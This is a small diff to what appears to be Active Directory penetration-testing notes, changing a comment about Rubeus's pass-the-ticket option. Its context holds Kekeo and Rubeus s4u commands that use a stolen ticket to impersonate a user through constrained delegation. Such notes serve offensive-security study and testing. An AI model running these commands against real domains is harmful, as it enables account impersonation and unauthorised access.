@@ -717,7 +717,7 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 ```
 * * * 
 
-Rubeus (can do /ptt here):
+Rubeus (can put ```/ptt``` to pass ticket now):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
 
 again:
